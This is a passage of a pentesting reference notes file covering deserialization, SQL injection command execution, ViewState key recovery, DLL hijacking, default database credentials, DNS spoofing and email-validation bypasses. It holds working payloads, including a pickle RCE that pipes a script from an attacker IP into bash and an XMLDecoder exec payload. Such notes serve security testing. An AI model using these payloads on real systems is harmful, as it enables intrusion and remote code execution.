>>> print(pickle.dumps([1,2,3]))
b'\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03e.'
>>> print(pickle.dumps({"A":123}))
b'\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x01A\x94K{s.'

# Test on Windows
Python 3.7.8 - [MSC v.1916 64 bit (AMD64)] on win32
>>> import pickle
>>> print(pickle.dumps("TEST"))
b'\x80\x03X\x04\x00\x00\x00TESTq\x00.'
>>> print(pickle.dumps([1,2,3]))
b'\x80\x03]q\x00(K\x01K\x02K\x03e.'
>>> print(pickle.dumps({"A":123}))
b'\x80\x03}q\x00X\x01\x00\x00\x00Aq\x01K{s.'
```

💻 Code to deserialize a Base64 encoded content using Pickle:

```python
import pickle, base64
encoded = "gAN9cQBYBQAAAG....."
decoded = base64.b64decode(encoded)
object = pickle.loads(decoded)
print(object)
```

💻 Payload example in order obtain a code execution during the deserialize phase:

```python
#!/usr/bin/python3
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('/usr/bin/curl 10.10.10.10/rs.sh | /bin/bash')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    encoded = base64.b64encode(pickled)
    print(encoded) # String to use
```

### When Java XMLDecoder class is used

💡 If the **class [XMLDecoder](https://docs.oracle.com/en/java/javase/17/docs/api/java.desktop/java/beans/XMLDecoder.html)** is used to deserialize an object, then, the following serialized object XML content (payload) can be used to achieve code execution during the deserialize phase:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="17.0.1" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
            <array class="java.lang.String" length="2">
                <void index="0">
                    <string>nslookup</string>
                </void>
                <void index="1">
                    <string>test.domain.com</string>
                </void>
            </array>
        </void>
    </object>
</java>
```

💻 Code to test to XML content above locally to adapt the payload:

```java
import java.beans.XMLDecoder;
import java.io.*;

public class Sandbox {
    public static void main(String[] args) throws Exception {
        XMLDecoder d = new XMLDecoder(new BufferedInputStream(new FileInputStream("test.xml")));
        Object result = d.readObject();
        d.close();
    }
}
```

## System command execution via SQL injection with PostgreSQL

🤔 System command execution can be achieved via a [User Defined Function](https://www.postgresql.org/docs/current/xfunc.html) associated to a custom library (see this [code](../templates/pg_cmdexec_extension.c) to compile for the target OS and version of PostgreSQL targeted).

For Windows, `system()` vs `ShellExecute()` usage for command execution:

* `system()` can be used on Windows too but it hang until the command executed is finished.
* `ShellExecute()` execute the command and continue without waiting that the command finish.

Follow these steps:

> Daily build of the extension for Linux 64 bits for several versions of PostgreSQL are provided [here](https://github.com/righettod/toolbox-pentest-web/actions?query=workflow%3A%22Build+PostgreSQL+extension%22).

1. Get the version of the DB and OS via the following query:

```sql
SELECT version();
```

2. For Windows install the headers files during the PG installation - For Linux install the following packages:

```shell
# For "postgresql-server-dev-10" install the version matching the version of PostgreSQL targeted
# based on information from the "SELECT version();" query
$ sudo apt install postgresql postgresql-server-dev-10 gcc
```

3. For Windows see [here](https://wiki.postgresql.org/wiki/Building_and_Installing_PostgreSQL_Extension_Modules#Windows_with_Microsoft_Visual_Studio) - For Linux use the following commands to compile the extension:

```shell
$ which pg_config
/usr/bin/pg_config
$ gcc -I$(/usr/bin/pg_config --includedir-server) -shared -fPIC -o pg_cmdexec_extension.so pg_cmdexec_extension.c
$ file pg_cmdexec_extension.so
pg_cmdexec_extension.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked
```

4. Use this [script](../templates/pg_cmdexec_via_lob.py) to load and use the library via an UDF in order to execute system commands via an SQLI (blind or not).

## Light web shell vs Heavy web shell

![shema](HeavyWebShellVsLightOne.png)

## Check if a ASPNET ViewState use leaked encryption and validation keys

> The tool [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r) will be used (Windows needed).

* [Documentation 1](https://notsosecure.com/project-blacklist3r/).
* [Documentation 2](https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/).

💻 Follow these steps:

**Step 1:**

👀 Get the value of the following HTML INPUT fields:

* `__VIEWSTATE`: It's the [View State](https://docs.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100)).
* `__VIEWSTATEGENERATOR`: It's the **modifier** parameter needed by the tool and that been used by the app to generate the ViewState (see [here](https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/) for hints about it, search for `__VIEWSTATEGENERATOR` in the page).

**Step 2:**

💻 Grab a [release](https://github.com/NotSoSecure/Blacklist3r/releases) of **Blacklist3r** and the command line below.

📍 Note:

* `/wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs=` is the **ViewState**.
* `CA0B0334` is the **modifier**.

:information_source: File `MachineKeys.txt` is provided with the release bundle.

```powershell
PS> .\AspDotNetWrapper.exe -r MachineKeys.txt -c "/wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs=" -p "viewstate" -m "CA0B0334" -s
Decode process start!!
Pocessing machinekeys AES,SHA1: 11/3571..............
Keys found!!
------------
DecryptionKey:F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2
ValidationKey:C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45
EncodedDataWithoutHash:/wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk
```

## DLL Hijacking explanation and exploitation materials

* [Documentation 1](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking).
* [Documentation 2](https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0).
* [Documentation 3](https://pentestlab.blog/2017/03/27/dll-hijacking/).
* [Documentation 4](https://attack.mitre.org/techniques/T1574/001/).
* [Notice about ".local" file](https://stackoverflow.com/a/3809197).

This [code](../templates/dll_hijacking_lib.c) is provided as a base to create a POC and this [workflow](https://github.com/righettod/toolbox-pentest-web/actions/workflows/build_dll_hijacking_lib.yml) build the 32 and 64 bits versions of the DLL for a Windows OS.

:speech_balloon: Compiled library files are added as build artefacts.

:speech_balloon: Fixation recommandations:

1. Restrict write access rights of the folder to the local admin only.
2. For Windows services: Specify to the service to run as the predefined [LocalService](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account) account (**no network access**). If network access is needed then use the predefined [NetworkService](https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account) account.

## Deployment strategies memo

| Strategy name         | Description                                                                                                         |
|-----------------------|---------------------------------------------------------------------------------------------------------------------|
| Canary                | Is where the new version is released to a subset of users which then proceed to a full rollout.                     |
| Big Bang              | This one update whole or large part of a application at one time.                                                   |
| Rolling Deployment    | Is where a new version is slowly rolled out replacing the older version.                                            |
| Blue/Green Deployment | Is where the new version is released alongside the old version and then the traffic is switched to the new version. |

## DBMS default connection information

### SQL

* [OracleDB default SID](http://www.red-database-security.com/whitepaper/oracle_default_sid.html)
* Useful tools for Oracle: [odat](https://github.com/quentinhardy/odat), [oscanner](https://gitlab.com/kalilinux/packages/oscanner).
* Useful related [nmap scripts](https://github.com/nmap/nmap/tree/master/scripts): `mysql-info`, `ms-sql-info`, `ms-sql-ntlm-info`, `oracle-tns-version`, `oracle-sid-brute`.

| DBMS       | Default username                       | Default password | Default database/schema | Default port     |
|------------|----------------------------------------|------------------|-------------------------|------------------|
| MySQL      | root                                   | None             | information_schema      | 3306             |
| SQL Server | sa (SQL Server authentication)         | None             | master                  | 1433             |
| SQL Server | administrator (Windows authentication) | None             | master                  | 1433             |
| PostgreSQL | postgres                               | postgres         | postgres                | 5432             |
| Oracle DB  | SYSADMIN                               | SYSADMIN         | SID: ORCL               | 1521, 1522, 1523 |

### NoSQL

* Useful related [nmap scripts](https://github.com/nmap/nmap/tree/master/scripts): `mongodb-info`, `redis-info`, `cassandra-info`.

| DBMS      | Default credentials | Default ports          |
|-----------|---------------------|------------------------|
| MongoDB   | No auth by default  | 27017, 27018, 27019    |
| Redis     | No auth by default  | 6379                   |
| Cassandra | cassandra/cassandra | 7000, 7001, 7199, 9042 |
| Neo4J     | neo4j/neo4j         | 7473, 7474             |

## Expose a malicious DNS server

💻 The tool [dnsmasq](https://wiki.debian.org/dnsmasq) is used to achieve the objective.

💡 In this procedure, the malicious server have the IP address: **152.118.178.206**.

💻 **On the malicious server** - Apply the following steps:

1. Create the file `dnsmasq.conf` with the following content:

```shell
addn-hosts=dnsmasq.hosts
```

2. Create the file `dnsmasq.hosts` with the following content to specify the name of the domain/subdomain you wanted to spoof:

```shell
152.118.178.206 target-domain.com
```

3. Start `dnsmasq` using the following command, in no daemon mode, to allow to kill it via `CTRL+C`:

```shell
$ dnsmasq -C dnsmasq.conf --no-daemon
dnsmasq: started, version 2.89 cachesize 150
dnsmasq: reading /etc/resolv.conf
dnsmasq: read /etc/hosts - 8 names
dnsmasq: read dnsmasq.hosts - 1 names
dnsmasq: reading /etc/resolv.conf
...
```

4. In another shell, validate the DNS setup via the following command:

```shell
$ dig @localhost target-domain.com
target-domain.com. 0 IN A 152.118.178.206
```

💡 Use the following command to see DNS queries made to the malicious DNS server:

```shell
tcpdump -i [INTERFACE_NAME] udp port 53
```

💻 **On a machine that can reach the malicious server** - Validate the DNS setup via the following command:

```shell
$ nmap -p 53 152.118.178.206
PORT   STATE SERVICE
53/tcp open  domain

$ dig @152.118.178.206 target-domain.com
target-domain.com. 0 IN A 152.118.178.206
```

## Chain of certificates

📍 A chain of certificates start with the **server** certificate (leaf) up to the **root CA** certificate.

💻 Example of a chain for a server certificate for the domain `lab.pentesterlab.com` in a PEM file:

```shell
# Create the chain PEM file with all the certificates of the chain
$ cat lab.pentesterlab.com.cer hackingwithpentesterlab.link.cer GandiRSADomainValidationSecureServerCA3.cer Sectigo.cer > chain.pem

# Display the chain hierarchy
$ openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -noout

subject=C = AU, ST = Victoria, O = PentesterLab, CN = lab.pentesterlab.com
issuer=CN = hackingwithpentesterlab.link

subject=CN = hackingwithpentesterlab.link
issuer=C = FR, O = Gandi, CN = Gandi RSA Domain Validation Secure Server CA 3

subject=C = FR, O = Gandi, CN = Gandi RSA Domain Validation Secure Server CA 3
issuer=C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust RSA Certification Authority

subject=C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust RSA Certification Authority
issuer=C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust RSA Certification Authority
```

📑 The chain is:

1. Server certificate `lab.pentesterlab.com`.
2. Sub CA n°1 `hackingwithpentesterlab.link`.
3. Sub CA n°2 `Gandi RSA Domain Validation Secure Server CA 3`.
4. Root CA `USERTrust RSA Certification Authority`.

## Email address format and potential validation bypasses

* [Source](https://en.wikipedia.org/wiki/Email_address).

📖 The base format of an email address is `[LOCAL-PART]@[DOMAIN-PART]`.

💬 Let's assume that a feature prevents you to register a user with an email belonging to the domain `company.com`.

👀 Below are different syntax that can be tested to try to bypass the validation in place:

* `dom%evil.com@company.com`: Usage of **%** escaped mail route to `dom@evil.com` via `company.com` (*try the inverse too*).
* `company.com!dom@evil.com`: Usage of bangified host route used [for uucp mailers](https://www.rfc-editor.org/rfc/rfc976.html) (*try the inverse too*).
* `dom@(comment)company.com` or `dom@company.com(comment)`: Equivalent to `dom@company.com` via the usage of a comment (*also supported in the `local-part`*).
* `"dom@test.com" <dom@company.com>`: Usage of the display format.
* `dom@company.com.uk`: Usage of a double domain suffix.
* `dom@company.com@evil.com`: Usage of a double domains part (*try the inverse too*).

👀 Other syntax using an IP address instead of the domain:

* `dom@[123.123.123.123]`: IP addresses are allowed instead of domains when in square brackets.
* `dom@[IPv6:2001:0db8:85a3:0000:0000:8a2e:0370:7334]`: IPv6 uses a different syntax.

## PSD2 API

### Authentication

💻 Use the following utility scripts to obtains an access or refresh token from an OAUTH2 Authorization Server:

* [oauth_client.py](../templates/oauth_client.py).
* [oauth_client_listener.py](../templates/oauth_client_listener.py).

### HTTP Signature

💻Use my [fork](https://github.com/righettod/HTTPSignatures) of this burp [extension](https://github.com/nccgroup/HTTPSignatures) from NCCGroup, with the following profile:

![httpsignatureprofile](PSD2_HttpSignatureProfile.png)

💡I added some logs and removed the filtering in method `BurpExtender.processHttpMessage()`.

👀In case of need of extra debug/update then import the project in IntelliJ IDEA and configure the following artifact to update the extension loaded into Burp:

![httpsignatureartifact](PSD2_HttpSignatureArtifact.png)

🚩If a request header, defined into the current profile used, for the current http method **is missing then the signature is not generated**. The following log is written: `[DOM][ERROR] Expected one value for header 'x-request-id' ==> signature skipped!`.
